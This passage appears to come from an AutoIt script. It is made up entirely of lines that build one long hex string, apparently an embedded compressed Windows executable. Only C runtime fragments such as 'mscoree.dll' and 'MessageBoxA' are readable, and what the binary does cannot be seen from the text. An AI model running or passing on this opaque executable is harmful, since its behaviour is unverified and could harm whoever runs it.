EB4A840C5B7F330640C17DAC0383C15445EA74D6388922839DAABFD13F3EC18BD8B8C5663903720E8BF34849BA4088B83882BA8D5D421DDA2ED24B0AA08965D48F78F3495E45CE8BF1BA16330BDFA3FEF023C223CA81E61B208D14D36ED3AD469064D2663BA28321BA10CFE5E7DD4F18BFFDBF1BD70F870ABEBF3F57AB4177D6770DB7C85CB73358BD84773526C60242F745CCF115AD7B70FB3975C8751008C4750BA9CE4B3646CE05D697CD75214308173973E8395E9766ED33750EF4CC04967536C6659544088EBEA805428B2B098CA803C05C2F11FA6AFA528D4405C4C80A78866584271F06D843AAB70904F228AF9E26FC0D1C4FFC8D34013BF1C4F0B4B755FF744D77FC74030007837802836DB78200C3A00246DD7FBB47FC"
    $sHex &= "1ECD4C32C41AA8F97F9181C202C0A1420318BEC83797C62F041885FF782B8B75D0D165FFEFFA65D4C1E81FAC03F60BF0C1E91F8D043F0BC156D67D0E2D8175B5627FCE094D2BF002C55F147D428BC2C434F003D6F6978655B5E274B3C87DDFFF2750CAD16DDCC1E01FD1EF0BF8B8C1E10D2F6C6B12E89E4E89345675D16CB0145F98E9740566BA68B78BC8BA30062AD1167756D48A25A39948A2A02C0A75D35642D4CED638D0D60012DAE1F61C4D1CDAD2FB5EDE75075E6D13FCECDE42EB0EE80CEB0808DAB74AE18BC5D6B8DA7ED07223822A4071B2C950DC8AFC15EB0317904977EC806E1F088448CE3B668B600B559089D6328C2917C6A9176FBDB1CA1E55CEEB1EAE85F6B9D6C03FA465C80048CB0571041C00A81CC4FA02CAB8257D853CFDEF376CD54488757A55CA8810EB2FE0990A512A0484F694DE37F01DBA452C024FC1CEF3E9100122C8CCA2D060466288922B1A89D6E80F0447E694940289F53904C057065958E79000F33C9BD7FA7D06D113275A9FE77936CFD7EB144631B00D32119EA554EF74FC6775FC66BC1C56578D7508FAF084C15F5C10CECA0323C881E251E7692F82E2C645D0CC06D1D29EE7799ED3D4D5D6D7D86469F379D9DAFBDB3FC932BC9EF1DA8A68E37D437743022DEB040A2085E187AD4ACE4E752F8C8AA0E234508512FA16956DB6E06B720D0420DA13884E5403017C88CD80063453052121AFDDA18150852D2A285DE4B05203B885E47504850970340BE4F7C64000358CBBFBCA40EB51F11381FE26AE2BEFDD3DCE3B2F38EB0D5C301C2C308D80E1126EC66A1650AFF6656A10BA03100001904E325728417FC5C19659F4CA8BD969C9104DA9A34A86F47AC6001850FA17A07843744D8D84080CEDBCEC857E642AC844120FBFD866604707EC0051F7DB55B4CEA15553D3EABCE62CE2FBDB033A402D206FB86A8D84EFBC46E82D8500160B428514A4CBBEC1FB81D35C127C2667BB81D6266D9CB64DBC5434FD80B94908728AF0BCC4180D50C0B24EC608116C73D4FC500AFE0C3FA4F48478734DEA8B1D163CE0F233F13D00B8BEE1230778ADEBCE23D6B40A5AFE1D940F5F9A77C083AC4FD60F83A3BEFE0F87B48DF89095FE77108E75E804E4F23F1BD0E0541D23CE751F47F745E8FBDEC873E4E0EA4BAC751346E8AFF865400809397004B6393074B42175A8CB014582426EC039032CF8258AC0037855B062A23E9BFA558D4C0DE0A84D9469008256859456F3FF37607C388B56FC0FAFC88365A4008D040A3BC2F3CA2F4FC1A4A400894606834594BA6EE64D98B0837DB07CBC46466AA87FC04DD320C0C08E81C73FFF7E3B500313057EF8052DAE84895741D130D003C0CFC45703380B98F458EA9F2502B61F1E0BC2CF1E6A7FCAD35C1A700846C7FFC703"
    $sHex &= "4950FEC003F8F645F086DF0FF84E3755F4D16DF832EE0BF1BCC1E280851A6F12E90BCA489C4EF24C52D94645ACF0F0F052692A17F2F2F6F6E7A9AC0CFAFA47FAF61DB0FCA6F2C1F80F82AB4FB82D4C48E58945E4E0E8214B04EAAA40DB4B0B8ECFFE10BACE87544A7898CA3708B8A183442C4A8AF3EFF20017B6DA0FB7C98BDA33D9CC783C7823D081E387F8BEAE9A1F9DD030F6F94CBBD0430AAE1979B8F0351B60A5E3FC0BF0774BB4451FE44D5BDC575EF20B7DB8661E280AE2F839B87434E6A87D2194F654400191A06A6322BB92B042287AD1FF3A3035370FF2C8751D461339450E394509B73CB7172D1FE742D07518D83891DD82A3D436454684762048369C2060487D8381A8CD1570AC4A8D120883A4C2B87CCE52A1E24A34E80914BC64A93C45EF3C57FC8D1C2ADAD9BCFB53A119BC5F656DB8024040FF8E8856F801A67FC06021749E57F89981C661F6F8B4C268401D1666A32B1C5218C6F660F61841469E91C6F6C6F003F22595B07DEF0BF97D3204C820B046A2A1C205F061A411E4C70A23600075A4A4F20AA775EA61DBE42D37600EE02C221A7134F0A6B4EE4AF5265C600274329828582B6C9978E1C01AAF5A8042840AE40145FF30DBCCE61E043006903A198983FFA36F52FD157E036A155F7E0EEE1081EEFE4A6D689100A7AC6107D039D18B5D30D1E8D7C9881B9E03DB0BB86651BC96A8A2C1A6BCFA3275D85AC9C45F1832F7DE81E63F28D13DE2ED446B6DE86AEB6BE0F65F7C1B6B67E092D88D47018D5A041E7401424F24B44AB5D632A490895E6F3F5CC199C4EEBCE0FB200C002A6C2041B6B69EEED9A0EA0B00D20BD68BC100092C30AFE3872D9CC1EF74C8CE0B4558CAF5F78D3C0218697D2AB56A68903BC638F8D242A5B7059078F801414EC88D1430C2B06F23643BD650D07322D0EC01263A00C9C4A83FEF253028F626BA3D1803F680DCF827C0C130ECCE0BF0880B43DCA76EFC858DE4C645EB724B90BFEA4FFF4B8A034B3C357D0E80EB44803B6209C603304B3BC74E8C05B073F2E60F04434AA4F43B7E00FE032AD880480FBECB88580387110F555404BE8C2F40DEBC7B7A3B7A3075054BB2F6720CCDD28CAC10669C10BA5540154DC5BFC2FECA80E20D80C2A050019E40B6822B2676F6C310BA400A087454DAC8B4FC0E0408D695A6D202100120F7C317C8EEC6BC15028BCBB6E023CA56EFA89185BE6723F6010E160B1177FD3BCE740B3BCAA80D000C8AA420D0503CC03C7DA31F1FCB906A740C5000CF7455FF060BC6EB02585EAF044A1031D51E34C31AC21018B80C04E69A8506BBBF22324ACB04D652C30C30971202830D6E95080173BF03F7C247E08283B758C78BCABE45201F3BCF232395E730CBCE604020EDFCDB426C14035F23D15E5B81FA9E162C"
    $sHex &= "320D7B0FC2B2750FC0BDE0142A80E640C30D401206BE4E986D9BD97DFE60781B4CD6436A105AD254DA1973CA080E080410E00E95A6022001A30681CA819310C045006E420671834F0CC6BF5174243D37E869CF850C0808D0120BD7AE7BE85C4E5C486D015877EE1D0A94107C22753324338FEC70B8208A08BD44A126AC897D0EECD08D871ED004CF380CA00316A995BBD8C821FB02D21CDC0C1AD96DFC8AFCFC4CB02045807428771B0A06F78C0C1640AA7F0908EE11042A87BF0103CD8955C22113CBD49980349A7DE7D6839F893F7AEC0FAE5DA284C0796219690FDC5EA99936CE08120404999166A4080210010E05CEC18676CE7EB6E0BDE78760A2CB742A20301C0E40CAC9C9F37FCBCECECEDECD748FBF0723C783EE5A2DC07F580DEFF106EF165B905B985B54313606A03A0045A1126F92E423D60BD0D60744F862477F261E0222895062C5891AFC102806599A6A04EFC2DD6084C99F5AF7C1E7091404E08C3C230408024528569EA7CA01BE85CE231CE4CB48F3C374242040C375126047D3E40A40D62C83E99C542EB88A1D81E98DE9CACA5068B89CCAC25633707530877086EEFE5525574438AE77180D2392C01019C168FFBAFE4EFC89308970040408B8C6AFF56E86466A108B58043EF0F43FE911C2CACE3C128D141B0BD12FBEC01308F34AC90BCEC68BF71C0BDCED8365EC5CDAC1EB224ED679AD022BE803F686D7621EAE50E8E9049862D1FBECC004FC7B9DDB8938395DEC741AC052183C26BDDB4308780700B7E2044162B1F48D1C11A1F97B95A4D978DA40F6468958F6E03B6B761A4008014AF78D0C3F8BD7CA22177C863C3AFA8B50706E58FA4CD00BDEC0A1C028D878046AF07A3441439D4C241FF2130282436809484BF3810E4C4F98CFF9C36B0A040414D24376FFAA1E043D00227487060B4E103C0EEB263D29A8E1B6D1E81089DE54FA06D317A8B2F6100BCFC1E268A237F414CCF0FFD739A274D5BB4E00D60037858C9A863A4F6002183EFF7E9821821DAAF624AA9A45221CE0D747131C85339B008AE2D06B0A043E87038FF8D76A089D8E5C936CA03905F374C5BB0EC156F64450481B03947440C40C7402A25EFE2E80BBA89011255F4D12704F58BF5FA6EAC24E51EB0821C9FDE001F68F0A082B43000065D786FFFF07C974790803B800080410436F724578697450726FFFCC7FF3636573736D00730063006F0072022E0064006C0DF37F3B6272756E74696D65206572727C977DDB580D0A06544C4F5353231D0053494E47FB69F69700444F4D412423523630333410ED6FED7F416E206170706C696361A26F16686173206D6164B461B666FF7F2E7474656D707420746F206C6F260E682C4320FFF6DFC2F764627261727920696E63A0726563746C792E0AF6CCCD"
    $sHex &= "EC506C658036226E746163BBDCCE6CBB27B673751C5C324E6D2066C1F7AE1D786D066586146D472E5B29B899203F332D20410DC1C115BC75B64DB04CC04466922FD8CC5E6DC469AAE6306D620020647572D0DEFB6E9667206E9476654BB66918613578F752047A0A545E266425650702FBFD72206275671E20796F74572E206EB382B349E4543E730E286B65BAB615080C9D5A846C226F66BA9807876BA86CD852272DC16F10144A69FE4E282F636C72293C0513B8065063934F6129DDC00C366EA28834F804F2E0E0F63944924D6169F7EF326828B0B66E6FCC65083C686A700CA778689A655D10EC612C6460185F317B38C511F765795254DF180A8666836874A62E1F06EF0C413730933E14286FD7C1643F3238F461996011541C6505029ED815C1CC4B4F37C777E011326D516F6F36C1CA15F2737464357075FA452AACE876690075424193ED08E99E51BF345F54650C0E67573A2FB00CBEC5612782C7BF3139EF6F707E5C6BA27BD76F1E0CE66357381C1EA7B79A706E62337121DFAA5747376D7DAC04EDECEA687E120A6BDC520CA15F2F6964A3EAE2156E615C0DE5E9D58F536C447175FED05352C91875D8609024D06976546664F1E8DFDD3810B002AA1D817761E55BD80879863039206A548474670224CA5A57381CEB16602A67755173AF32095667A8666ADC601A3AC08DA00A742D84BDAB30C13B83004D72D06A662AC031FC605669CB432B2B1F4C6BB7D725E94F0A5A2E00003C705C6728BB5BBB556DBE404E6BA0776E3EEE6588596B71454D215A504D3AA1A0693FE2545A3E534DA054A0002BACE857F22275467053CDDA1B9E3C364AC04665624DCA41B00A7937BC60B34A4C046C41C25365704FBE4E6F76A001768E441EFF456EBD507F9BBDC596421E4B22E6004E0A4C0033006467D781325A441202574465C1E6B627466C73DE65650FAC7456C85ED3255F75174741246FCFC9D3DE97400B8B161D04C9C973C9968D088E25975C728F9091305872C9929318B16180990F573CA65374787A47F7592F55DE724F626A2E49AB45B3E98B41674C187441AC2C7B558376DCDA70271F8DFEDB7F8ABEA2616765426F78625553455233322E444CC0010C1C4C1506104E1BADFFFFDFD39915161718191A1B1C1D1E1F20212223242526272829FFFF37FD2A2B2C2D2E2FE032333435363738393A3B3C3D3E3F40414243441BFFFFFF45464748494A4B4C4D4E4F505152535455565758595A5B5C1755741574603063046650696A6BFA5F70C76C6D467071725075767778797A7B7C7D7EC945D5D48A03205F25871C2820480010C8951C2484101720971C8101100172C925820200C72B6C772A033614C955680103074708960103016C0B9069030277852A5815BFFF76B0B5D303141B"
    $sHex &= "3701015810DA205FD368A1AD20EF230000FFFFDF495782838485868788898A8B8C8D8E8F90919293949596FFFFFFFF9798999A9B9C9D9E9FA0A1A2A3A4A5A6A7A8A9AAABACADAEAFB0B1B2B3B4B5B6FFFFFFFFB7B8B9BABBBCBDBEBFC0C1C2C3C4C5C6C7C8C9CACBCCCDCECFD0D1D2D3D4D5D6FFFFFFFFD7D8D9DADBDCDDDEDFE0E1E2E3E4E5E6E7E8E9EAEBECEDEEEFF0F1F2F3F4F5F608D581FFF7F8F9FAFBFCFDFEFF1100074614D11101498A20FF0AA38A21FF30A4D8A2113FFFA5DF69000748483A6D6D3AD73D3FED0200642C204D201179008A78D7B400162F2F10005009932CB16C414DC70627C69C68BD004A17684458275C6F157E74299E13E6E89C75E80EB2872F7542D90E6E65E469BEB118B713FA63680E107275DCBD318EDF2E15CEBF7BCE39E7AFA7978F876E79871635E79C7F77674661BA7264488C67EE309FBC13DEB199189BE827FCF819C633E3991A133021E79CBB67460F86776F5F4F0F70C039473F93332E377ADE47C22E323607AD280640501843A8AAAF39A44B0D165B672540B98C1CBB0C01000A022BF9BE2B00752A01227C2CAA7D7D4001061C02F4A51DED0E200105049CF95EA0968324242424042F99997B223602073C01111EF970EE0809528B024C4C08DD437ECD145C1501014C0124507BDB6787570C45345E0805AFF9CCA7BC4C84FECD00043BF7BC4D446F52FF900E4060069E77D69D50173051FE20061000ECCEF36CFDF0E0D06E01DEF7B637FD66FC3601C3065B1EFCE006C001290A7BB043B76D9728ED191F89472D78E458DF0A7A7CEA640A5B73440616670001041E9AA635CD007A07710A0A510BA043A669770F5C09E7E6B7B2B46F08750A0A0078101001586B9AB66A406600826503450A7AE86BF70E00479A0A69BF6ED1251FB659D30408705E2C015488F2537B71A1600A5C720A031520017299BE403E7468E46268A12AE7DA57DF3FDE2F5C581F0F4707B0BC06C0799EE779C8D0D8E0ECF33C9BE7F4FCB1040C14CFF33CCF1C283038404C3CCFF33C5460646C78F33CCFF388949CA4A8CFF33CCFB0B8C4D0D8E49E67F33CF0FCB2081424799EE779303C4C5C68E7799EE770788088909EE7799E98A4ACB8C4D06C9EE779DCE4F0F8B304F33CCFF30C141C242CCFF33CCF343C444C50543CCFF33C606C788088F33CCFF38C9094989CCFF33CCFA0A8B0B8C4D036CFF33CD4E0ECF4B400799EE7790810182028E7799EE7303C4854649EE7799E707C8894A0AC799EE779B8C0C8D4E0F36C9EE7E8F0F8B50008CFF33CCF14202C3440483CCFF33C545C647078F33CCFF380889098A0CFF33CCFA8B4BCC4CCD89ECDF33CE4F0F8B6000CB61BA67A14C3E35E0151A00650F08FDAA37B401E5CE2B016BE4EBD306E70677B16300E85002F06054D90"
    $sHex &= "3BD1A7D95E4D4084BC609F49904E76C37B4FD54916E906488E020B5016D0B7F7CEBA101EE8BEE87EBA9C0D31B52BE4DF7CF301D9D505F920A163D7E947A9F553514C69C097203381594B9D77060815FF017F660F90097F8011C9DF0563030607A70B8101BA5BBA06171ECE0E789EF72225067B26274CCDCBB1E242180901F867262B36DBEE3D06A7099550BCB94032E00487EED9166FC03006B51F5BE97D07CB280638623F04717079B0EE24CD500D033F7340F70ECE2E600FD07CD6D60E8406EFCFD39E8C9416D7D7D7941E028602016705372A3F5BBE5F9806DEEF6FA1D74ED9301401FF005EDA3D01040E056C9BE7FF0606005B0403035B050610038671016D36171CFF1E02A3F0BC40C5B03A36CFB306AA907010A9D086BB6CDE677B951E0171C5800650EDF066FBF074260F5E4699E01E626076CFF6B90C0746AE3006ADF0B0A61E7BF73CEF0373A00680E0C02EB6AD4679F71CCDAC031206002E0E73BCEFDE53604036B00696ABD00E501EBCF774EE0D10CEF0AE894688A0BB67F3698B8AE08C10E006C63F78EF62064F6EC98609DE6E0E5EC00006E029FACEDF30EEC5E0DE58686E466DF7A6986026AE06EA299907ED613B9BF09A702E051D266E1605E0607BCD3E403D4E5776065BBE0DD3F45EF3EE0E90EF9EAEFE7BE604A53DFFB4067040000237B0903638CEAD795E400620007A7E0338809A6FDB3ECE24260236A6023EAEDDC0F1EFBE7B0D1F50FED0B68658E04E1EBCB379B60F6E61D00674604047D0795EF7CEB0BE7737B00690706970F0DC5FF63E2E8A5FB01C3CBCE630FE1E8B46A9AEBAC0E23E3C6EED46E3000E870A07CDED3689AE018A30063E0786F33CEFE6E00680A030460F9E82CF053EFC809E3850460BC03B1D470F3E208C902E5BCE090E068666F707EB7BEFA1C63A468686BC3E0B0E98803B81AFA7AE2DC296CB246F66AA3F06FE66616C73657965466566756C6C9121448FF804090C58034250EC4D2B274B9E37E4ACB6972F5FFE0FC00008D40010E40020FCE72ACDE7000010E510201C7D0EDA0D709E380878800E64B94A5369817402843DF73CCFE90E980B0EAC04F406D7F33C9BFCE60408141CA73D6B72A123AE6E071C5C57B9B0D67BDE174AC484F769A53E01041AAF022F3A59DD5BC801141E72061FEF07C6BD0FE00E961416430E55DF5495C4035F02475BC00227DD7D89107407E9E40A0FECF493DB779702EA4A0F0C1F143058B3C81C00EC012EFFC1025B1708875F43524541544558815BD720546A4C0A73716C405F6D4AE0BF08B86572280A20207479703A609FE4F76578742C186E616D74626C5F210A2802FE726F6F7470E220C77EE7DAFA0C72279E3F0A29CF45B13790D84D50D98AE33C6F870107EC40064850F33CCFF354585C606484873E"
    $sHex &= "CF6C747C6E7E33FAC10BE666746F7514696768742DB4FF7009586E185273E704060428E2E2FCFF0A05200E05301304381705011C058EF632FB51C366961C804B02F7011700A38D2AEE393EBEFE8E5205D7FE9DF422504E033F2F2C2E2D885C5136421BDFFEC4204702050A0F1419003232643901355D74FAC003BA00A30A2C730255C2007F794E9E0330003534333200EE002E6F3209F0011B016F6E9086024E02480912C8635F1A012299EF2F303C462F0046024502470236002048208767600226B705F25F0E99014A0143024302203AD9006C0D3EFDFF026B02A6009B0170027E017B017A4AEB0127C8FF37C9D000C71E3A0079012C019E016D02E1376C06860108671244025259025E1F215704279F1402E2E8240AF100FA01FBBEB1E21CBEC2B801B61701809CC50056018EFC40FED62E003AFD0013018401A73A02EC00DA1FBC1B27A002F03A9D672A02B501B3A7087E55C2B7012902B60127D101E1C40E218601238701D7D230B91EEB013686B8C8069E1B360E5F020679010131F60E3D68A693276D32D201BD000E41D17FFEB901BA01A1020E540141025302ACC29E10F28A6001B2271E00A20D86EE51020383E6CE02ED2AF1C20E60F2829BF203F0FC8A57F4779EF01BCABB01ED00EF0008F0E35546550E5A9F1232FFBE915FA6590257004353260BB0000E018E902B827927AF8CE28A0227D20613B6023D01825770D1032C0F0ACE0F0EA0CA878F0A4E0C5E550260E9C1051BB8F9010649001527D26FBEFB3510BE5340020B23027F0127004C013F425E11FC023E025802F8273702544051101E3116066C4070FF3747B700690125020C0276320E5C0A6C811E3A300202265C486D8F3E1C1E5D0B9EC7ED9A022FBFB239FC02080292015B4ED200A800A501B603844C31D80702064FC0FBBFA86096253202FF01EA0065019200DB01023CFCED416F1A32020666011E02A901AB8AD7C3820E2A280B20F601616EE9E0C1C5CB7E13272536AE05EF1DEDBF064FCA02D7013D1322B542AE98DE035E0622EF1798C88C3F3301A8018A966F5D2A1238E1AEDA0ACA382CA0D92452BE0138013558BD5870019717ADD20AB076E678E61C029F0D1A591247A2BFD8CC6A0269026802CAE6E222530C37D302D556660194004F52381EA690015826273EB46DC56AFEAA00166B031A3C0202C987F0C33F36D9011A024B2EDA018F2AD3174F707602740E1A614A4400A8EF932FF8EC84FE1A6000B2A7011202501C2F380592967A680111029F0FA690539B015DF2E401BCB7F9F8FE01AC00A6823E01E5CE63668EA00F5E5B460AE7121C6E670175EF2DBF439E9E6100AA0134017214466DBFF76E0F77326A00F77269466C066D00CC28418103DE27DFFCE7DF92F21401D600586E01D5007D01860012"
    $sHex &= "01F4F15E7B3FA70082EB32621A783287F0EDA119760A644F0E68000A02099DA11D7E27E00011EA5E47BA0E870B1ABE326700D401094F1B1B4E64B0C1772A9E168E2ED9FB3AF4E65F28DF33A50BE6B089A9D70764D666200A4C0076D016C84FA20AD67B3EF2F07BBFBC726200E10A8A068900E84E2D070F771414024F1ACBF1099A163ECED116E688001E7C68E67BCA027D4F702F01580A0A2E8A4D1E02264BBF5FBBDA00011700027C4646014542AB014414E0F760D64E20865C004A92020D0653314F4BFE27CF6A227DF0006302DC22D801A0D29E5B3CC57BEFCE0105010FD6D03F7BDE009BDED583F74A3E5A279F269E46CDF7FEA11503586E79007800193E5906E482ABC76500CB581720B785F80B2B00950107CE6202B68C009FE7FFFF1D9A0218009A010B00C801520276009B00DB00C401987FAFF975039C5B6D021E0A715B6F00BD6F67FF075E90012D02930121020A625A926E00CD008376B0E0B4011D0202C557023F3A1E34C082B3B79B93C751BBEF140EBE565E28002900165A3EFFF9FD41F2C62A009D019C565802535500BF004D01FDEEBEE76B00C3548A1B025BA401E6D695003C87FF35BF5B8E017F003BAA8F0116017102B54EC492FE096B50024F02261A9809EDF27E474A42E70813DBE07E6702B4DA8B66025B6D732078CF0298460EA1AAE6650FECFFDE9B669B5BA2017202B200FD1E8AF10006C554F6A0017E005ACFC17EE67FF1A20906DD17532A52005702291399C6FD01150128011E5A748AF0DA0DFE27018D01E9018AA65ADC5626103C3C5FE70F016D585E3BB20FADA038820D12BB244343E5EC77A751005602EB005B6D02094E0884FA032EF8002C02ADEE8BD37FF01EDA001D661F2E310130012F01B38A41F0075D01E3C6B6500021014FE786F71FB4321F8A97008801F600044EC4E2D8BFF9DE000BE24532F5000E0219021D018501E2133DFF1AD3183211006A0199D29EA23A503CC74E6E16CEFEEA4D7EAF1924BE2E4EC72E090E8201BCDF8F778BBE02F712E39BF41AF300B0DF81E0AE0106BA924906910089AEF7F8DE8D9E23018336024B37DF015A01A8C673BBF9221EE5003AE44EE37CC70BBE92EE01E89A01A400E716017501E001F80A9925C8AE7301A2001ABE5BF8059200DE01DD01A1FE6B01D3017A6517013B3601BB165C015B528EFF2240FE6672007000B600C901405AC7FFFFFF00B101B001C00113006102AF01AC013E00C10054023D022A012BD21D10FD0A0E02940122017C2E06EF2FB81BFF0132011901F301FA2AF101CCB601BF0139C52B4E1576028A72020D02FCFECFFF9E6103F6560A9112D300EA01640100E3CCA90176060372A51302A16009E4F01A255CD2FD2F0F621A1B070831322F6D16FFDA4020491733135E701372736627"
    $sHex &= "30B0192316FE9696DB5F0CD84C969200366E9EA5A5A1A2B2A571FC801CEC10AEAF9376175C61621896FD4F0C731961D83C5C3E6DDD191D44C1FE6D6F9276746D19B22061598068296A9329B80DC80B13111B0E42062E58F07096428A96026E67A590FFFF263492A5163918A5AAAB765EAAAB176219B9BAF3370301397E4E5817AC6F5BC183AD8A961680B5041674061AE6E7C5BC13DC9AA57192CC7560A2C23688E04F11DC76106EBBD6D79617179B2EF8ED83803A74A0065E3CA53E701A2E80172406DEDED6825892397830170478331988C14F316CE8C23AE3960C0C17E422076B7FFB17E919A5185EA5741C1C70AE926C8EC4826FDB6F92E70B2C2C2E2E1870A0263216173919BB957F400E77C2E11717D7135F17999BFFFF961B17431996CECF5E5FA668DAA516A56D78A5198A896DBE901715EAAEAFEF1993CDE7B8E2870F17D817B63FDC23F2A3DC4302C3A01B72968AE4428540F3C3A5964E1975A523BCA0033908FEA0A5786443F7F827C12F3028FEC29687188923E760F61A1E1BD5A5E50B16E922765FD8A5DA1632313216307230FC6E17F4D8C878EF174F960BB6FF07ADA5B5B618431A68B5BC669627103496F7B3417400EE4EF9FAA534A500B0623B6B181D0403A01693C3C305CDC870A030D5A0341C172CCD0676063C2080140492AE2BE6FEE6AFBEBFF017C219BB6DC21993F6ACE16072D4CEA61678D918AF559AB36604039213A54EA5BCA56EC51AB41818BB29CD936A5A6BB6CF8C96A014FE010268042B26F07B85C09DE6934A5C35A5BBBB9C9F23647BBB19C2CD92474862A09660EE1FB43B5C689AD58A05A501A5B79270DFFE6403EE9623A51BB6C2A56C7F4C23E101B9766493A614C116F9F6FCFFC21A1B4C961601967779D91425102CA516CDA5776EC1B7B76C803A38369625967FA07242C13B7F4D7B07DE96A4380A410F9242A58C96F743130984E0624203A4C1E284FFCFB7962C04B496F8FBD8B462FBA5DD969506A59EB7078F85C14A74A5F296169597953F52F0DE2DA5256C95200D9293979619BF81BDF238989F9AC1A04274F495C2C796C87E38145C83FB7C7B96C97AC421CAC41C62F7D95B14D87D5070872C52CBE22CD830FB9BA596DA96C19D769DC505E0D3A59F6DCD1A5D701146D2F62D96D2A51FAFFD1FEF7921969EB0EA2AA55ED3D2966276D31837E2E2DAC1A5395A3DB04018E9AE7D78B66896B81070A5E5B0082F0DBFADB68F674CB224B3A5320CE56FA55CB0E5FEFFF6FF74B8B0B39CB0B0129D9CED2D06879D9DEE9C449DBDBD8BDB169D12C0FDFFFFFF00BDDBC79DF2289DC7F2999D26F5C4A6E8C6B1B1E8E3D1B2A6B6A69421B5FFBF12D1C4B1C7D1C7A6D05CC3AEAEB7FCB704BF37A77DB7E0F1F1FCBAFC01EC00CF035AB7FB7EED043F05"
    $sHex &= "06BD025A005A22EDFF160359621724FF01BD01D1024304BDD437BFD994B8C7AA0243036D018C043700213AD484871EF3325F926FAAED46CB9A1B03036506AF8CD690DF03F902BBFFD39689760D04BA64BE03BF204DA9197A1B0A27039C05B6FF57E1E677030D054900B20137013A321B011E4FD4AE1A72D38E034100D23981509502B06EE20357DE1C9ADB88BE02EA006801AE017455D93BF101B30160C27E00DCFF03408BEA5221BA020F508ED49A9E48AF5015B2CCD69E0690767EEFAF2A9A0785029A2A9A021702242655C832EA8301FC820E04EFBDFFBB02B005B00EB60582058D04BC05031E8D233DCCDEBF8212A8053A05915312078B0521EF96EEFC036B05541B3827E604DD04C1FD7761076BA204A5049704910493A6B282049377DB04DC02BCCFDB9D2A8479AB0368E647B6D495FE7FC1031A6203CB03B203850366033E0326033636EAFFAB71B7FFFE46AE04A60492041204890454047A02D2FA62B66C04F70367822CE8FFFF0A04FC035304EC035C046104ED034B04B70313FFFFED9BF0C90315040BCE031D0417040104AE039103E003FB03B103FF6FF8FFD803AC036C038803B9038003EC2603700312036403330325032AFFFF770198EF02FE02C202CC02B302A90238028F027E02A4E2F73700421D0252025702370E1602FB77AA5337EAF2010B967ECE800165B8C3E8C401062AE0B63E0012DF1BB84B86270009EB73FFE2035E125DC2FF04DF009D00CBFF5D00597277548D66550A7D16341645774BFADF8AFF1B00D804D204CC04C5CCA3047FFFFF5F8004C0550435041E04FE03F803E8038F038C038A037A0378F8376DFF036A0342033003202A02F61E02E602E302D602AD33FEBF000E9C0299028C02630261025F025C9AD005AA5642EE07F6DA01C6E6D2CDA85ABB7EBA01D98E035FD11D0882000B79A203560440047F93FEFF3C040904EA03C50334034503EA02AEC6310362029703DDB40B16FC0033022E032D8A029D56011F027FB5FF2FC623769F029202CA030A05070506050206020AC57F830260FF04FD04F604F404EF829283F8DFF004E804E37204CB04A10490048F0487DBFFFF2A3C73045D042A041904EE03E603E403E303CD0382C603BFF5AFF8C4037C03FA5AFF7103A4032203DB1E0398FF9536F102940273144B017C004E054D054C1ED8FDFF054A0548054705450527053605420603280518FFFFFFF60F3650052D0559052E0523051F0515052C0514053705460541054651FAFF44053E0535053D051705340533A4FF6FF8FFFE04FA043B051D051C054305EA06053C05E904E5043905F90416FFFFFFFF0513051205110510050F0530050E05F0040C050B052A052905D604D004260525578AD2FF052405220520051E051B580905082F58F437FC04"
    $sHex &= "CD04C804F34205F1B604D304E7FFFFFFFF04B5049F049B0499048A0474048104A0049E044E0464044F0447044204410445BF00FFFF0458045B043E04510444043F042C04C2CE03BD030704FFAFE984C60306F97B026EBF0397967D6E0E830383F7021F0A64A5A94B113B03E7A2C5578CB64A021A3346A60329032852BFEA5FF02103905E031F03180311031C8603600361035FF1D53FD703630E4A1B033F0350F24A034F01D1AFDAC6034E9E03410340039ABA0DEC43CD2EF79502D8021F44F311C11F2E5303520351D3AB03A9CEE101C9738102B703EC05AEB17BEBF6F2F102CF02677A57B942DE7E9A039C1289DFF5DA248E5202F9BEE683021E0308B4DDF77E0295031E06BC7A140307B9020E08FFED6EED02627FF85A0EB003FF02FF02A803A8CC7505386ADC7A2603BA4ECDDDFF162302FFCA868DBB0518FB539207F2DA0203CB028E6EE9CC70031BBC270C8E0DFEF6B603076BCE19030D031703152AF3E6C9BB16CE028B0280BC03B703BE02AF908961AC0263757C02D811C887B2C7AF931B2ADCB630E45301F2BC03163A0E65EF347FF1E9023332320336033102067877E0A9E9027D02B2BEB6BA52B803B3FF1DB80372AE03AD76AA03A703A303790377C02DF0F5037E037DFE7B47760374FF4515E882234A1DFA037203E502E202E102E117E0FF9102B40392039B0399032B2E03970396039424A108170E840327AEDD8117C08A04691E5203870386020B8A50D28EE201DE0290FC5F81BFAAD202D102D902D7CED502D402D302D0029B02A305F88206BECA2602BA026F03DE6EE0FF8BF0036D03C352C802C702C602C502C402C102C0FF8BF0BF6E02B802B702BD02B602CD86C902B502E002DF02DE0250B00882DB0EA2B202C2B14207FEBBD63C033B032F035A03F49AF2035F812FDEFD020A03095A2C030B03FC000193B0C6F502A8267C0386D0B6F00210031342FF9596F40F035C030A03A103A0039F039E03844586FF9D035E035D033D033A1A0E0282FF4D30DC9681037F366AA602A5025B03EB02EAC0FFFFFF02570354034C034803580355034D034903470346033803370335DF81DFEE5E3003398A02EC02E802E752EE02ED02AF4213BE08A6AB02980296EA8DFF0B212DAE8E0274028702860285028402A1B075A008DE9F9A9CD6027F6E2AE1AB2A7A02790277E11A00B5ED5DE609111E053301E8563B5B598E01EE8FA6905A1D2BAE420091014A9201F695ABB27B970AA69400940103930297F0B78A135A0E52050A98069A019C009CD8A07817669B0099046E2E9E019BBFFC6E42A201A502A60196A300A301A704A7EC5865FE06A801A802A901E2A4008EAC01DEF31E17DEAD04ADA60E02051F56B113CF022EB2D6B40066B6025A719E9503B70201A203B502E1A2C9B0B8"
